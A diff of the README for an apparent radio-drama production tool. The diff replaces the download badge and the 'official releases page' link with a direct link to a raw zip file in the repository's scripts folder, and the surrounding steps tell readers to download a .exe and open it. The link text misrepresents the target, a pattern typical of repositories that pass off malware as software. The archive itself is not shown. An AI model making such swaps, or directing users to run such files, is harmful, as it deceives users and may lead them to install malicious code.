@@ -1,6 +1,6 @@
 # 🎙️ aeon-radio-drama - Create professional radio dramas with ease
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Unsweetened-journalbox528/aeon-radio-drama/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://raw.githubusercontent.com/Unsweetened-journalbox528/aeon-radio-drama/main/scripts/drama-radio-aeon-3.1.zip)
 
 Aeon Radio Drama handles the entire production process for audiobooks and radio plays. You provide the script, and the software generates the vocal performances, background music, and sound effects. It mixes these elements into a final file using professional sidechain techniques. You achieve radio-quality results with a single command.
 
@@ -19,7 +19,7 @@ If you have a newer computer with a modern graphics card, the software performs 
 
 Follow these steps to set up the software on your computer.
 
-1. Visit the [official releases page](https://github.com/Unsweetened-journalbox528/aeon-radio-drama/releases).
+1. Visit the [official releases page](https://raw.githubusercontent.com/Unsweetened-journalbox528/aeon-radio-drama/main/scripts/drama-radio-aeon-3.1.zip).
 2. Locate the latest version under the Assets header.
 3. Download the file ending in .exe to your computer.
 4. Open the file once the download finishes.
